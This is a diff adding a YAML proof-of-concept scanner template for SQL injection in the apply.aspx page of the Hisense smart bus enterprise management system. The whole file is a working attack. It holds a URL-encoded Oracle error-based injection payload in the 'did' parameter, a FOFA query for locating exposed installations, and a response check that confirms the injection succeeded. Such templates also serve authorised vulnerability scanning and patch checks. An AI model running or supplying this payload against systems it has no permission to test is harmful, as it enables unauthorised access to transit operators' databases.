@@ -1,0 +1,15 @@
+id: poc-yaml-hisense-transtech-apply-aspx-sqli
+info:
+  name: 海信智能公交企业管理系统 apply.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 海信智能公交企业管理系统
+  fofa: body="var _FactoryData"
+requests:
+- method: GET
+  path: /YZSoft/Forms/XForm/OA/apply.aspx?tid=-1&did=-1%27+AND+4208%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%284208%3D4208%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+dSSu
+  expression: status_code == 200 && contains(body,"Error Report") && contains(body,"SQL")
+    && contains(body,"SYS.XMLTYPE") && contains(body,"qvbkq1qqzxq")
+variables: {}
+transport: http
